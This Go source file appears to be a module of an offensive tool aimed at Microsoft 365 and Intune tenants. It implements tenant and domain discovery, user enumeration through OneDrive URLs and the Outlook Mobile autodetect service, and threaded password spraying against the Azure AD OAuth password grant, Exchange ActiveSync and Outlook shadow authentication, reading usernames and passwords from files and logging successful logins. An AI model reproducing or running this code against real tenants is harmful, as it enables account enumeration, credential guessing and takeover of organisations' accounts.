package intune

import (
	"dauthi/utils"
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
	"time"
)

type mdma struct {
	opts     utils.ChargeOpts
	logr     *utils.Logger
	tenant   []string
	domain   []string
	tokenURL string
	cycle
}

type cycle struct {
	buff   *chan bool
	block  *chan bool
	length int
	api    *utils.API
}

const (
	Usage = `
  Intune Options:
    -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]

    -tenant                o365 Tenant
  `

	// Methods are available tool methods
	Methods = `
  Intune Methods:
    disco                  intune endpoint discovery query
    disco-tenant           o365 tenant/domain query
    prof-outlook           Outlook Mobile service profiling
    enum-onedrive          o365 onedrive email enumeration of target o365 tenant
    enum-onedrive-full     o365 onedrive email enumeration of all o365 tenant/domains
    enum-outlook           Outlook Mobile user enumeration
    auth-async             SFA against 0365 Active-Sync endpoint
    auth-msol              SFA against o365 OAuth endpoint
    auth-outlook           SFA against o365 Outlook Basic Auth
	`

	discoveryAPI     = `https://enterpriseenrollment.%s`
	onedriveAPI      = `https://%s-my.sharepoint.com/personal/%s/_layouts/15/onedrive.aspx`
	tenantAPI        = `https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc`
	openIDAPI        = `https://login.windows.net/%s/.well-known/openid-configuration`
	outlookAuthAPI   = `https://outlook.office365.com/shadow/v2.0/authentication`
	asyncAPI         = `https://outlook.office365.com/Microsoft-Server-ActiveSync`
	outlookMobileAPI = `https://prod-autodetect.outlookmobile.com/detect?services=office365,outlook,google,yahoo,icloud,yahoo.co.jp&protocols=all&timeout=20`

	tenantPOST = `<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/` +
		`messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" ` +
		`xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/` +
		`2001/XMLSchema"><soap:Header><a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/` +
		`GetFederationInformation</a:Action><a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc` +
		`</a:To><a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo></soap:Header><soap:Body>` +
		`<GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover"><Request><Domain>%s</Domain>` +
		`</Request></GetFederationInformationRequestMessage></soap:Body></soap:Envelope>`

	msolPOST = `resource=https://graph.windows.net&client_id=a7aff123-97b3-498e-b2d4-c9d6f9fcc34a&client_info=1&grant_type=password` +
		`&scope=openid&username=%s&password=%s`

	outlookAuthAPIPost = `{"client_id": "OutlookMobile", "grant_type": "remote_shadow_authorization", "remote_auth_provider": "OnPremiseExchange", ` +
		`"remote_auth_protocol": "BasicAuth", "remote_server": {"hostname": "outlook.office365.com", "disable_certificate_validation": true}, ` +
		`"remote_auth_credential": {"userId": "%s", "secret": "%s", "email_address": "%s"}, ` +
		`"display_name": "%s"}`
)

func b64encode(v []byte) string {
	return base64.StdEncoding.EncodeToString(v)
}

func b64decode(v string) []byte {
	data, _ := base64.StdEncoding.DecodeString(v)
	return data
}

// Init mdma with default values and return obj
func Init(o utils.ChargeOpts) *mdma {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(21)
	}
	log := utils.NewLogger("intune")

	return &mdma{
		opts:   o,
		tenant: []string{},
		domain: []string{},
		logr:   log,
		cycle: cycle{
			api: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// clone() copies an *mdma for process threading
func (m *mdma) clone() *mdma {
	clone := Init(m.opts) // assign target
	clone.domain = m.domain
	clone.tenant = m.tenant
	clone.cycle.block = m.cycle.block
	clone.cycle.buff = m.cycle.buff

	return clone
}

// Wrapper to parse JSON/XML objects
func (m *mdma) parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.cycle.api.Resp.ParseJSON(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.cycle.api.Resp.ParseXML(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

func (m *mdma) pullDomains(silent bool) {
	var domains struct {
		Domain []string `xml:"Body>GetFederationInformationResponseMessage>Response>Domains>Domain"`
	}

	m.cycle.api.Name = `autodiscover`
	m.cycle.api.URL = tenantAPI
	m.cycle.api.Data = fmt.Sprintf(tenantPOST, m.opts.Endpoint)
	m.cycle.api.Method = `POST`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"Content-Type":    []string{"text/xml; charset=utf-8"},
			"SOAPAction":      []string{"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"},
			"User-Agent":      []string{"AutodiscoverClient"},
			"Accept-Encoding": []string{"identity"}}}
	m.cycle.api.Proxy = "" //Proxy request hangs for API call?

	m.cycle.api.WebCall()
	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Method}, "Tenant Request Failed")
		return
	}

	if m.parser(&domains, "xml") {
		return
	}

	domcount, tencount := 0, 0
	for _, dom := range domains.Domain {
		if strings.Contains(dom, "onmicrosoft.com") {
			tencount++
			dom := strings.Replace(dom, ".onmicrosoft.com", "", -1)
			m.tenant = append(m.tenant, dom)
		} else {
			domcount++
			m.domain = append(m.domain, dom)
		}
	}

	if !silent {
		if tencount > 0 {
			m.logr.Infof([]interface{}{tencount}, "o365 Tenant(2) Identified")
			for _, v := range m.tenant {
				m.logr.Successf([]interface{}{v}, "Tenant Domain")
			}
		}

		if domcount > 0 {
			m.logr.Infof([]interface{}{domcount}, "o365 Domain(s) Identified")
			for _, v := range m.domain {
				m.logr.Successf([]interface{}{v}, "Alias Domain")
			}
		}
	}
}

func (m *mdma) getToken() {
	var token struct {
		TokenURL string `json:"token_endpoint"`
	}

	m.cycle.api.Name = `openid-query`
	m.cycle.api.URL = fmt.Sprintf(openIDAPI, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()

	// Validate response status
	if m.cycle.api.Resp.Status != 200 {
		if m.opts.Debug > 0 {
			m.logr.Debugf([]interface{}{m.opts.Endpoint}, "Invalid Server Response Code: %v", m.cycle.api.Resp.Status)
		}
		m.logr.Errorf([]interface{}{"openid-query"}, "Failed to identify tenant ID")
		return
	}

	if m.parser(&token, "json") {
		return
	}

	m.tokenURL = token.TokenURL
}

func (m *mdma) disco() {
	m.cycle.api.Name = `discoveryAPI`
	m.cycle.api.URL = fmt.Sprintf(discoveryAPI, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = nil

	m.cycle.api.WebCall()

	// Validate response status
	if m.cycle.api.Resp.Status != 302 {
		if m.opts.Debug > 0 {
			m.logr.Debugf([]interface{}{m.opts.Endpoint}, "Invalid Server Response Code: %v", m.cycle.api.Resp.Status)
		}
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
		return
	}
	m.validate()
}

func (m *mdma) prof() {
	m.cycle.api.Name = m.opts.Method
	m.cycle.api.URL = outlookMobileAPI
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent},
			"X-Email":    []string{m.opts.UserName}}}

	m.cycle.api.WebCall()

	// Validate response status
	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Profiling Failed")
		return
	}
	m.validate()
}

func (m *mdma) auth() {
	var file []byte
	var err error

	if m.opts.File != "" {
		file, err = utils.ReadFile(m.opts.File)
		if err != nil {
			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.opts.Threads)
	buff := make(chan bool, len(lines))
	m.cycle.block = &block
	m.cycle.buff = &buff
	m.cycle.length = len(lines)

	if m.opts.Method != "enum-onedrive-full" {
		m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)
	}

	if m.opts.Method == "auth-msol" {
		m.getToken()
		if m.tokenURL == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Unable to identify Token Endpoint")
			return
		}
	}

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.cycle.buff <- false
			continue
		}

		target := m.clone()

		if line == "" {
			line = target.opts.UserName
		} else {
			target.opts.UserName = line
		}

		switch m.opts.Method {
		case "enum-onedrive":
			udscore := regexp.MustCompile(`(?:@|\.)`)

			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = fmt.Sprintf(onedriveAPI, target.opts.Tenant, udscore.ReplaceAllString(target.opts.UserName+"@"+target.opts.Endpoint, `_`))
			target.cycle.api.Data = ""
			target.cycle.api.Method = `GET`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent": []string{target.opts.Agent}}}

		case "enum-onedrive-full":
			if target.opts.Tenant == "" ||
				len(target.domain) == 0 {
				target.pullDomains(true)

				if len(target.tenant) == 0 {
					m.logr.Errorf([]interface{}{target.opts.Method}, "Failed to pull tenant details")
					return
				}

				m.logr.Infof([]interface{}{target.opts.Method}, "threading %d values across %d threads", len(lines)*(len(target.tenant)*len(target.domain)), target.opts.Threads)
				for _, ten := range target.tenant {
					if !utils.Resolver(ten + "-my.sharepoint.com") {
						m.logr.Infof([]interface{}{target.opts.Method, ten}, "Tenant non-Resolvable: tasklist decreased of %v", len(lines)*len(target.domain))
						continue // Skip Unresolvable
					}

					for _, dom := range target.domain {
						target.opts.Tenant = ten
						target.opts.Endpoint = dom
						target.auth()
					}
				}
				return
			} else {
				udscore := regexp.MustCompile(`(?:@|\.)`)

				target.cycle.api.Name = target.opts.Method
				target.cycle.api.URL = fmt.Sprintf(onedriveAPI, target.opts.Tenant, udscore.ReplaceAllString(target.opts.UserName+"@"+target.opts.Endpoint, `_`))
				target.cycle.api.Data = ""
				target.cycle.api.Method = `GET`
				target.cycle.api.Opts = &map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent": []string{target.opts.Agent}}}

				target.thread()
				continue
			}

		case "enum-outlook":
			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = outlookMobileAPI
			target.cycle.api.Data = ""
			target.cycle.api.Method = `GET`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent": []string{target.opts.Agent},
					"X-Email":    []string{target.opts.UserName}}}

		case "auth-msol":
			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = m.tokenURL
			target.cycle.api.Data = fmt.Sprintf(msolPOST, target.opts.UserName, target.opts.Password)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"Accept-Encoding": []string{"gzip, deflate"},
					"Accept":          []string{"application/json"},
					"Content-Type":    []string{"application/x-www-form-urlencoded"},
					"User-Agent":      []string{"Windows-AzureAD-Authentication-Provider/1.0 3236.84364"}}}

		case "auth-outlook":
			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = outlookAuthAPI
			target.cycle.api.Data = fmt.Sprintf(outlookAuthAPIPost, target.opts.UserName, target.opts.Password, target.opts.Email, target.opts.Email)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"X-DeviceType": []string{"Android"},
					"Accept":       []string{"application/json"},
					"User-Agent":   []string{"Outlook-Android/2.0"},
					"X-DeviceId":   []string{utils.RandGUID()},
					"X-Shadow":     []string{"2a6af961-7d3c-416b-bcfe-72ac4531e659"},
					"Content-Type": []string{"application/json"}}}

		case "auth-async":
			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = asyncAPI
			target.cycle.api.Data = ``
			target.cycle.api.Method = `OPTIONS`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":    []string{target.opts.Agent},
					"Authorization": []string{b64encode([]byte(target.opts.UserName + ":" + target.opts.Password))},
					"Content-Type":  []string{"application/x-www-form-urlencoded"}}}

		default:
			m.logr.Failf([]interface{}{m.opts.Method}, "Unknown Method Called")
		}
		target.thread()
	}

	for i := 0; i < m.cycle.length; i++ {
		<-*m.cycle.buff
	}
	close(*m.cycle.block)
	close(*m.cycle.buff)
}

// thread represents the threading process to loop multiple requests
func (m *mdma) thread() {
	*m.cycle.block <- true
	go func() {
		m.cycle.api.WebCall()

		if m.cycle.api.Resp.Status == 0 {
			if m.opts.Miss < m.opts.Retry {
				m.opts.Miss++
				m.logr.Infof([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
				<-*m.cycle.block
				m.thread()
				return
			}
			m.logr.Failf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Null Server Response")
		}
		m.validate()

		// Sleep interval through thread loop
		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
		<-*m.cycle.block
		*m.cycle.buff <- true
	}()
}

func (m *mdma) validate() {
	switch m.opts.Method {
	case "disco":
		if m.cycle.api == nil {
			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
		} else if m.cycle.api.Resp.Header["Location"][0] == "https://intune.microsoft.com/" {
			m.logr.Successf([]interface{}{"intune.microsoft.com"}, "Endpoint Discovered")
		}

	case "enum-onedrive", "enum-onedrive-full":
		if m.cycle.api.Resp.Status == 302 {
			if len(m.cycle.api.Resp.Header["Location"]) > 0 {
				if strings.Contains(m.cycle.api.Resp.Header["Location"][0], "my.sharepoint.com") {
					m.logr.Successf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName}, "Valid User")
				} else {
					break
				}
			} else {
				break
			}
		}
		m.logr.Failf([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName}, "Invalid User")

	case "enum-outlook", "prof-outlook":
		var check struct {
			Email    string `json:"email"`
			Services []struct {
				Hostname string `json:"hostname"`
				Protocol string `json:"protocol"`
				Service  string `json:"service"`
				AAD      string `json:"aad"`
			} `json:"services"`
			Protocols []struct {
				Protocol string `json:"protocol"`
				Hostname string `json:"hostname"`
				AAD      string `json:"aad"`
			} `json:"protocols"`
		}

		if m.cycle.api.Resp.Status != 200 {
			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Nonexistent Domain")
			return
		} else if m.parser(&check, "json") {
			return
		}

		if m.opts.Method == "prof-outlook" {
			if len(check.Services) > 0 {
				for _, i := range check.Services {
					m.logr.Successf([]interface{}{i.Service, i.Protocol, i.Hostname}, "Supported Service: %s", i.AAD)
				}
			}
			if len(check.Protocols) > 0 {
				for _, i := range check.Protocols {
					m.logr.Successf([]interface{}{i.Protocol, i.Hostname}, "Supported Protocol: %s", i.AAD)
				}
			}
			return
		}

		if len(check.Services) > 0 {
			m.logr.Successf([]interface{}{m.opts.UserName}, "Valid User")
			return
		}
		m.logr.Failf([]interface{}{m.opts.UserName}, "Invalid User")

	case "auth-msol":
		if m.cycle.api.Resp.Status == 200 {
			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Successful Authentication")
		} else if m.cycle.api.Resp.Status == 400 {
			var check struct {
				Error string `json:"error_description"`
			}
			if m.parser(&check, "json") {
				return
			}
			// Error Message Body
			// AADSTS50126: Error validating credentials due to invalid username or password.\r\n
			re := regexp.MustCompile(`^(.+?): (.+?)\n`)
			data := re.FindStringSubmatch(check.Error)
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, data[1]}, "%s", data[2])

		} else {
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "Unknown Response")
		}

	case "auth-outlook":
		m.logr.Infof([]interface{}{m.opts.Method}, "Under development")
		m.logr.Infof([]interface{}{m.opts.Method}, "Status: %v - Headers: %v - Body: %s", m.cycle.api.Resp.Status, m.cycle.api.Resp.Header, m.cycle.api.Resp.Body)

	case "auth-async":
		if m.cycle.api.Resp.Status == 200 {
			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Successful Authentication")
			return
		}
		m.logr.Failf([]interface{}{m.opts.Email, m.opts.Password}, "Failed Authentication")

	}
}

// Call represents the switch function for activating all class methods
func (m *mdma) Call() {
	switch m.opts.Method {
	case "disco":
		m.disco()

	case "disco-tenant":
		m.pullDomains(false)

	case "prof-outlook":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.prof()

	case "enum-onedrive":
		if m.opts.UserName == "" &&
			m.opts.File == "" ||
			m.opts.Tenant == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Tenant/User/File required")
			return
		}
		m.auth()

	case "enum-onedrive-full":
		if m.opts.UserName == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "User/File required")
			return
		}
		m.auth()

	case "enum-outlook":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.auth()

	case "auth-msol":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.auth()

	case "auth-outlook":
		if (m.opts.UserName == "" || m.opts.Email == "") && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "User/Email or Email/User-File required")
			return
		}
		m.auth()

	case "auth-async":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.auth()

	default:
		m.logr.StdOut(Methods)
		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
	}
}
